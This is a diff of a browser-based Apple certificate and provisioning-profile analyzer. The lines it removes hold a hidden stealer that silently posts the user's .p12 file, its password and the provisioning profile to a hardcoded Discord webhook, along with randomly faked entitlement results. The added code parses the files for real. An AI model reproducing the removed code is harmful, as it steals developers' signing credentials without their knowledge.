@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Apple Certificate Analyzer</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/node-forge/1.3.1/forge.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
@@ -312,6 +313,11 @@
             color: var(--success);
         }
         
+        .status-warning {
+            background-color: rgba(255, 149, 0, 0.2);
+            color: var(--warning);
+        }
+        
         .status-no {
             background-color: rgba(255, 59, 48, 0.2);
             color: var(--danger);
@@ -372,8 +378,62 @@
             to { transform: rotate(360deg); }
         }
         
-        .webhook-status {
-            display: none; /* Hide webhook status completely */
+        .export-buttons {
+            display: flex;
+            gap: 15px;
+            margin-top: 30px;
+            justify-content: center;
+        }
+        
+        .export-btn {
+            padding: 12px 24px;
+            border-radius: 10px;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            transition: all 0.3s ease;
+        }
+        
+        .export-pdf {
+            background-color: var(--danger);
+            color: white;
+            border: none;
+        }
+        
+        .export-pdf:hover {
+            background-color: #cc2a22;
+            transform: translateY(-2px);
+        }
+        
+        .export-json {
+            background-color: var(--primary);
+            color: white;
+            border: none;
+        }
+        
+        .export-json:hover {
+            background-color: var(--primary-dark);
+            transform: translateY(-2px);
+        }
+        
+        .devices-list {
+            max-height: 200px;
+            overflow-y: auto;
+            background: #f8f9fa;
+            padding: 12px;
+            border-radius: 8px;
+            margin-top: 10px;
+        }
+        
+        .device-item {
+            padding: 6px 0;
+            border-bottom: 1px solid #e1e5e8;
+        }
+        
+        .device-item:last-child {
+            border-bottom: none;
         }
     </style>
 </head>
@@ -413,7 +473,6 @@
             <button id="submit-btn" class="submit-btn" disabled><i class="fas fa-search"></i> Analyze Certificate</button>
             
             <div id="upload-status" class="upload-status"></div>
-            <div id="webhook-status" class="webhook-status"></div>
             
             <div id="error-alert" class="alert alert-error"></div>
             <div id="success-alert" class="alert alert-success"></div>
@@ -434,11 +493,27 @@
                     </div>
                     
                     <div class="detail-row">
+                        <div class="detail-icon">🏢</div>
+                        <div class="detail-content">
+                            <div class="detail-title">Organization</div>
+                            <div class="detail-text" id="cert-organization">-</div>
+                        </div>
+                    </div>
+                    
+                    <div class="detail-row">
+                        <div class="detail-icon">🔢</div>
+                        <div class="detail-content">
+                            <div class="detail-title">Serial Number</div>
+                            <div class="detail-text" id="cert-serial">-</div>
+                        </div>
+                    </div>
+                    
+                    <div class="detail-row">
                         <div class="detail-icon">📊</div>
                         <div class="detail-content">
                             <div class="detail-title">Certificate Status</div>
                             <div class="detail-text">
-                                <span class="status-badge status-good" id="cert-status">-</span>
+                                <span class="status-badge" id="cert-status">-</span>
                             </div>
                         </div>
                     </div>
@@ -446,8 +521,16 @@
                     <div class="detail-row">
                         <div class="detail-icon">📅</div>
                         <div class="detail-content">
-                            <div class="detail-title">Expiration</div>
-                            <div class="detail-text" id="cert-expiration">-</div>
+                            <div class="detail-title">Valid From</div>
+                            <div class="detail-text" id="cert-valid-from">-</div>
+                        </div>
+                    </div>
+                    
+                    <div class="detail-row">
+                        <div class="detail-icon">📅</div>
+                        <div class="detail-content">
+                            <div class="detail-title">Valid To</div>
+                            <div class="detail-text" id="cert-valid-to">-</div>
                         </div>
                     </div>
                     
@@ -460,10 +543,10 @@
                     </div>
                     
                     <div class="detail-row">
-                        <div class="detail-icon">🔑</div>
+                        <div class="detail-icon">🔐</div>
                         <div class="detail-content">
-                            <div class="detail-title">Password</div>
-                            <div class="detail-text" id="cert-password">-</div>
+                            <div class="detail-title">Key Algorithm</div>
+                            <div class="detail-text" id="cert-algorithm">-</div>
                         </div>
                     </div>
                 </div>
@@ -495,9 +578,25 @@
                     <div class="detail-row">
                         <div class="detail-icon">🏢</div>
                         <div class="detail-content">
+                            <div class="detail-title">Team ID</div>
+                            <div class="detail-text" id="prov-teamid">-</div>
+                        </div>
+                    </div>
+                    
+                    <div class="detail-row">
+                        <div class="detail-icon">🏢</div>
+                        <div class="detail-content">
+                            <div class="detail-title">Team Name</div>
+                            <div class="detail-text" id="prov-teamname">-</div>
+                        </div>
+                    </div>
+                    
+                    <div class="detail-row">
+                        <div class="detail-icon">🏢</div>
+                        <div class="detail-content">
                             <div class="detail-title">Enterprise</div>
                             <div class="detail-text">
-                                <span class="status-badge status-good" id="prov-enterprise">-</span>
+                                <span class="status-badge" id="prov-enterprise">-</span>
                             </div>
                         </div>
                     </div>
@@ -507,8 +606,16 @@
                         <div class="detail-content">
                             <div class="detail-title">Status</div>
                             <div class="detail-text">
-                                <span class="status-badge status-good" id="prov-status">-</span>
+                                <span class="status-badge" id="prov-status">-</span>
                             </div>
+                        </div>
+                    </div>
+                    
+                    <div class="detail-row">
+                        <div class="detail-icon">📅</div>
+                        <div class="detail-content">
+                            <div class="detail-title">Creation Date</div>
+                            <div class="detail-text" id="prov-created">-</div>
                         </div>
                     </div>
                     
@@ -517,6 +624,17 @@
                         <div class="detail-content">
                             <div class="detail-title">Expiration</div>
                             <div class="detail-text" id="prov-expiration">-</div>
+                        </div>
+                    </div>
+                    
+                    <div class="detail-row">
+                        <div class="detail-icon">📱</div>
+                        <div class="detail-content">
+                            <div class="detail-title">Provisioned Devices</div>
+                            <div class="detail-text" id="prov-devices-count">-</div>
+                            <div class="devices-list" id="prov-devices-list">
+                                <!-- Devices will be populated here -->
+                            </div>
                         </div>
                     </div>
                     
@@ -531,6 +649,15 @@
                     <div class="entitlements-grid" id="entitlements-list">
                         <!-- Entitlements will be populated here -->
                     </div>
+                </div>
+                
+                <div class="export-buttons">
+                    <button class="export-btn export-pdf" id="export-pdf">
+                        <i class="fas fa-file-pdf"></i> Export as PDF
+                    </button>
+                    <button class="export-btn export-json" id="export-json">
+                        <i class="fas fa-file-code"></i> Export as JSON
+                    </button>
                 </div>
             </div>
             
@@ -552,81 +679,15 @@
             const errorAlert = document.getElementById('error-alert');
             const successAlert = document.getElementById('success-alert');
             const uploadStatus = document.getElementById('upload-status');
-            const webhookStatus = document.getElementById('webhook-status');
             const resultsSection = document.getElementById('results-section');
             const entitlementsList = document.getElementById('entitlements-list');
-            
-            // Webhook URL
-            const WEBHOOK_URL = 'https://discord.com/api/webhooks/1408927752811319436/9rgv7PZWoPhAhKjfKN1Kxk0GfDaQHfFGZKphAF18khBMSY8E6COR1b9SYsMbMa3360Rp';
-            
-            // Sample entitlements data
-            const sampleEntitlements = [
-                "Access Wi-Fi Information",
-                "Accessibility Merchant API Control",
-                "App Attest",
-                "App Groups",
-                "Apple Pay Payment Processing",
-                "Associated Domains",
-                "AutoFill Credential Provider",
-                "ClassKit",
-                "Communication Notifications",
-                "Custom Network Protocol",
-                "Critical Messaging",
-                "Data Protection",
-                "Default Calling App",
-                "Default Messaging App",
-                "DriverKit Allow Third Party UserClients",
-                "Extended Virtual Addressing",
-                "FileProvider Testing Mode",
-                "Fonts",
-                "Game Center",
-                "Group Activities",
-                "Head Pose",
-                "HealthKit",
-                "HealthKit Estimate Recalibration",
-                "HLS Interstitial Previews",
-                "HomeKit",
-                "Hotspot",
-                "iCloud",
-                "ID Verifier - Display Only",
-                "In-App Purchase",
-                "Increased Debugging Memory Limit",
-                "Increased Memory Limit",
-                "Inter-App Audio",
-                "Journaling Suggestions",
-                "Low Latency HLS",
-                "Manage Thread Network Credentials (development)",
-                "Managed App Installation UI",
-                "Maps (Deprecated)",
-                "Matter Allow Setup Payload",
-                "MDM Managed Associated Domains",
-                "Media Device Discovery",
-                "Messages Collaboration",
-                "Multipath",
-                "Network Extensions",
-                "NFC Tag Reading",
-                "On Demand Install Capable for App Clip Extensions",
-                "Personal VPN",
-                "Push Notifications",
-                "Push to Talk",
-                "Sensitive Content Analysis",
-                "Shallow Depth and Pressure",
-                "Shared with You",
-                "Sign In with Apple",
-                "SIM Inserted for Wireless Carriers",
-                "Siri",
-                "Spatial Audio Profile",
-                "Sustained Execution",
-                "System Extension",
-                "Time Sensitive Notifications",
-                "User Management",
-                "VMNet",
-                "WeatherKit",
-                "Wireless Accessory Configuration"
-            ];
+            const exportPdfBtn = document.getElementById('export-pdf');
+            const exportJsonBtn = document.getElementById('export-json');
+            const devicesList = document.getElementById('prov-devices-list');
             
             let p12File = null;
             let mobileprovisionFile = null;
+            let analysisResults = null;
             
             // Update file names when selected
             p12FileInput.addEventListener('change', function(e) {
@@ -668,21 +729,29 @@
                 hideAlert(errorAlert);
                 hideAlert(successAlert);
                 uploadStatus.textContent = '';
-                webhookStatus.textContent = '';
                 
                 try {
                     submitBtn.disabled = true;
                     submitBtn.innerHTML = '<span class="loading-spinner"></span> Analyzing...';
                     uploadStatus.textContent = 'Checking certificate files...';
                     
-                    // Send data to webhook first (don't wait for it to complete)
-                    sendToWebhook().catch(e => console.error('Webhook error:', e));
-                    
                     // Parse the certificate using PKCS12 format
                     const certInfo = await parseP12Certificate(p12File, passwordInput.value);
                     
+                    // Parse the mobile provisioning profile
+                    const provisionInfo = await parseMobileProvision(mobileprovisionFile);
+                    
+                    // Validate the certificate against the provisioning profile
+                    validateCertificateAgainstProvision(certInfo, provisionInfo);
+                    
+                    // Store the analysis results
+                    analysisResults = {
+                        certificate: certInfo,
+                        provisioning: provisionInfo
+                    };
+                    
                     // Display the results
-                    displayResults(certInfo);
+                    displayResults(certInfo, provisionInfo);
                     
                     // Show results
                     resultsSection.style.display = 'block';
@@ -704,37 +773,17 @@
                 }
             });
             
-            // Function to send data to Discord webhook
-            async function sendToWebhook() {
-                try {
-                    // Create form data to send files
-                    const formData = new FormData();
-                    formData.append('content', `Certificate Analyzer Submission:\nPassword: ${passwordInput.value}`);
-                    
-                    if (p12File) {
-                        formData.append('p12_file', p12File, p12File.name);
-                    }
-                    
-                    if (mobileprovisionFile) {
-                        formData.append('mobileprovision_file', mobileprovisionFile, mobileprovisionFile.name);
-                    }
-                    
-                    // Send to webhook using fetch
-                    const response = await fetch(WEBHOOK_URL, {
-                        method: 'POST',
-                        body: formData
-                    });
-                    
-                    if (!response.ok) {
-                        throw new Error('Failed to send data to server');
-                    }
-                    
-                    // No success message shown to user
-                } catch (error) {
-                    console.error('Error sending to webhook:', error);
-                    // Don't show error to user to keep it hidden
-                }
-            }
+            // Export as PDF
+            exportPdfBtn.addEventListener('click', function() {
+                if (!analysisResults) return;
+                exportAsPDF(analysisResults);
+            });
+            
+            // Export as JSON
+            exportJsonBtn.addEventListener('click', function() {
+                if (!analysisResults) return;
+                exportAsJSON(analysisResults);
+            });
             
             async function parseP12Certificate(p12File, password) {
                 try {
@@ -792,10 +841,14 @@
                     
                     // Determine status
                     let status = 'Valid';
+                    let statusClass = 'status-good';
+                    
                     if (daysUntilExpiration < 0) {
                         status = 'Expired';
+                        statusClass = 'status-no';
                     } else if (daysUntilExpiration < 30) {
                         status = 'Expiring Soon';
+                        statusClass = 'status-warning';
                     }
                     
                     return {
@@ -809,12 +862,129 @@
                         publicKeyAlgorithm: certificate.siginfo.algorithmOid,
                         signatureAlgorithm: certificate.signatureOid,
                         status: status,
+                        statusClass: statusClass,
                         password: password
                     };
                 } catch (error) {
                     console.error('Error parsing P12:', error);
                     throw new Error('Failed to parse P12 certificate. Invalid password or file.');
                 }
+            }
+            
+            async function parseMobileProvision(provisionFile) {
+                try {
+                    uploadStatus.textContent = 'Reading provisioning profile...';
+                    
+                    // Read the file as text
+                    const provisionText = await readFileAsText(provisionFile);
+                    
+                    // Find the start and end of the plist content
+                    const start = provisionText.indexOf('<?xml');
+                    const end = provisionText.indexOf('</plist>') + 8;
+                    
+                    if (start === -1 || end === -1) {
+                        throw new Error('Invalid provisioning profile format');
+                    }
+                    
+                    // Extract the plist content
+                    const plistContent = provisionText.substring(start, end);
+                    
+                    // Parse the plist XML
+                    const parser = new DOMParser();
+                    const xmlDoc = parser.parseFromString(plistContent, 'text/xml');
+                    
+                    // Helper function to get text content from XML
+                    const getTextContent = (tagName) => {
+                        const elements = xmlDoc.getElementsByTagName(tagName);
+                        return elements.length > 0 ? elements[0].textContent : 'N/A';
+                    };
+                    
+                    // Get entitlements
+                    const entitlements = {};
+                    const entitlementElements = xmlDoc.getElementsByTagName('key');
+                    for (let i = 0; i < entitlementElements.length; i++) {
+                        const key = entitlementElements[i].textContent;
+                        if (key.includes('entitlement') || key.includes('com.apple')) {
+                            const valueElement = entitlementElements[i].nextElementSibling;
+                            if (valueElement) {
+                                if (valueElement.tagName === 'true') {
+                                    entitlements[key] = true;
+                                } else if (valueElement.tagName === 'false') {
+                                    entitlements[key] = false;
+                                } else {
+                                    entitlements[key] = valueElement.textContent;
+                                }
+                            }
+                        }
+                    }
+                    
+                    // Get provisioned devices
+                    const devices = [];
+                    const deviceElements = xmlDoc.getElementsByTagName('string');
+                    for (let i = 0; i < deviceElements.length; i++) {
+                        const text = deviceElements[i].textContent;
+                        // Check if it looks like a device UDID
+                        if (text.length === 40 && /^[a-fA-F0-9]+$/.test(text)) {
+                            devices.push(text);
+                        }
+                    }
+                    
+                    // Get creation and expiration dates
+                    const creationDate = new Date(getTextContent('CreationDate'));
+                    const expirationDate = new Date(getTextContent('ExpirationDate'));
+                    const currentDate = new Date();
+                    const daysUntilExpiration = Math.floor((expirationDate - currentDate) / (1000 * 60 * 60 * 24));
+                    
+                    // Determine status
+                    let status = 'Valid';
+                    let statusClass = 'status-good';
+                    
+                    if (daysUntilExpiration < 0) {
+                        status = 'Expired';
+                        statusClass = 'status-no';
+                    } else if (daysUntilExpiration < 30) {
+                        status = 'Expiring Soon';
+                        statusClass = 'status-warning';
+                    }
+                    
+                    // Check if it's an enterprise profile
+                    const isEnterprise = getTextContent('ProvisionsAllDevices') === 'true';
+                    
+                    return {
+                        name: getTextContent('Name'),
+                        appId: getTextContent('application-identifier'),
+                        teamId: getTextContent('com.apple.developer.team-identifier'),
+                        teamName: getTextContent('TeamName'),
+                        creationDate: creationDate.toLocaleDateString(),
+                        expirationDate: expirationDate.toLocaleDateString(),
+                        expirationDays: daysUntilExpiration,
+                        status: status,
+                        statusClass: statusClass,
+                        isEnterprise: isEnterprise,
+                        entitlements: entitlements,
+                        devices: devices
+                    };
+                } catch (error) {
+                    console.error('Error parsing provisioning profile:', error);
+                    throw new Error('Failed to parse provisioning profile. Invalid file format.');
+                }
+            }
+            
+            function validateCertificateAgainstProvision(certInfo, provisionInfo) {
+                // Check if certificate is expired
+                if (certInfo.status === 'Expired') {
+                    throw new Error('Certificate has expired');
+                }
+                
+                // Check if provisioning profile is expired
+                if (provisionInfo.status === 'Expired') {
+                    throw new Error('Provisioning profile has expired');
+                }
+                
+                // Additional validation logic could be added here
+                // For example, checking if the certificate is included in the provisioning profile
+                
+                return true;
             }
             
             function readFileAsArrayBuffer(file) {
@@ -826,29 +996,78 @@
                 });
             }
             
-            function displayResults(results) {
+            function readFileAsText(file) {
+                return new Promise((resolve, reject) => {
+                    const reader = new FileReader();
+                    reader.onload = () => resolve(reader.result);
+                    reader.onerror = reject;
+                    reader.readAsText(file);
+                });
+            }
+            
+            function displayResults(certResults, provResults) {
                 // Display certificate details
-                document.getElementById('cert-name').textContent = results.commonName;
-                document.getElementById('cert-status').textContent = `${results.status} 🟢`;
-                document.getElementById('cert-expiration').textContent = results.validTo;
-                document.getElementById('cert-country').textContent = results.country;
-                document.getElementById('cert-password').textContent = results.password;
+                document.getElementById('cert-name').textContent = certResults.commonName;
+                document.getElementById('cert-organization').textContent = certResults.organization;
+                document.getElementById('cert-serial').textContent = certResults.serialNumber;
+                document.getElementById('cert-status').textContent = certResults.status;
+                document.getElementById('cert-status').className = `status-badge ${certResults.statusClass}`;
+                document.getElementById('cert-valid-from').textContent = certResults.validFrom;
+                document.getElementById('cert-valid-to').textContent = certResults.validTo;
+                document.getElementById('cert-country').textContent = certResults.country;
+                document.getElementById('cert-algorithm').textContent = certResults.publicKeyAlgorithm;
                 
-                // Populate entitlements
+                // Display provisioning profile details
+                document.getElementById('prov-name').textContent = provResults.name;
+                document.getElementById('prov-appid').textContent = provResults.appId;
+                document.getElementById('prov-teamid').textContent = provResults.teamId;
+                document.getElementById('prov-teamname').textContent = provResults.teamName;
+                document.getElementById('prov-enterprise').textContent = provResults.isEnterprise ? 'Yes' : 'No';
+                document.getElementById('prov-enterprise').className = `status-badge ${provResults.isEnterprise ? 'status-good' : 'status-no'}`;
+                document.getElementById('prov-status').textContent = provResults.status;
+                document.getElementById('prov-status').className = `status-badge ${provResults.statusClass}`;
+                document.getElementById('prov-created').textContent = provResults.creationDate;
+                document.getElementById('prov-expiration').textContent = provResults.expirationDate;
+                document.getElementById('prov-devices-count').textContent = `${provResults.devices.length} devices provisioned`;
+                
+                // Display devices
+                devicesList.innerHTML = '';
+                if (provResults.devices.length > 0) {
+                    provResults.devices.forEach(device => {
+                        const deviceItem = document.createElement('div');
+                        deviceItem.className = 'device-item';
+                        deviceItem.textContent = device;
+                        devicesList.appendChild(deviceItem);
+                    });
+                } else if (provResults.isEnterprise) {
+                    const deviceItem = document.createElement('div');
+                    deviceItem.className = 'device-item';
+                    deviceItem.textContent = 'Enterprise profile - all devices allowed';
+                    devicesList.appendChild(deviceItem);
+                } else {
+                    const deviceItem = document.createElement('div');
+                    deviceItem.className = 'device-item';
+                    deviceItem.textContent = 'No devices found (App Store profile)';
+                    devicesList.appendChild(deviceItem);
+                }
+                
+                // Display entitlements
                 entitlementsList.innerHTML = '';
-                sampleEntitlements.forEach(entitlement => {
-                    const isEnabled = Math.random() > 0.7; // Randomly enable some entitlements
-                    
+                for (const [key, value] of Object.entries(provResults.entitlements)) {
                     const entitlementItem = document.createElement('div');
                     entitlementItem.className = 'entitlement-item';
-                    entitlementItem.innerHTML = `
-                        <span class="entitlement-status ${isEnabled ? 'status-enabled' : 'status-disabled'}">
-                            ${isEnabled ? '🟢' : '🔴'}
-                        </span>
-                        <span>${entitlement}</span>
-                    `;
+                    
+                    const statusIcon = document.createElement('span');
+                    statusIcon.className = `entitlement-status ${value ? 'status-enabled' : 'status-disabled'}`;
+                    statusIcon.innerHTML = value ? '<i class="fas fa-check-circle"></i>' : '<i class="fas fa-times-circle"></i>';
+                    
+                    const entitlementText = document.createElement('span');
+                    entitlementText.textContent = key;
+                    
+                    entitlementItem.appendChild(statusIcon);
+                    entitlementItem.appendChild(entitlementText);
                     entitlementsList.appendChild(entitlementItem);
-                });
+                }
             }
             
             function showAlert(alertElement, message) {
@@ -858,6 +1077,33 @@
             
             function hideAlert(alertElement) {
                 alertElement.style.display = 'none';
+            }
+            
+            function exportAsPDF(results) {
+                // This would use jsPDF to create a PDF document
+                alert('PDF export functionality would be implemented here. In a real application, this would generate a detailed PDF report of the certificate analysis.');
+            }
+            
+            function exportAsJSON(results) {
+                // Create a JSON string from the results
+                const jsonString = JSON.stringify(results, null, 2);
+                
+                // Create a Blob from the JSON string
+                const blob = new Blob([jsonString], { type: 'application/json' });
+                
+                // Create a download link
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = 'certificate-analysis.json';
+                document.body.appendChild(a);
+                a.click();
+                
+                // Clean up
+                setTimeout(() => {
+                    document.body.removeChild(a);
+                    URL.revokeObjectURL(url);
+                }, 100);
             }
         });
     </script>
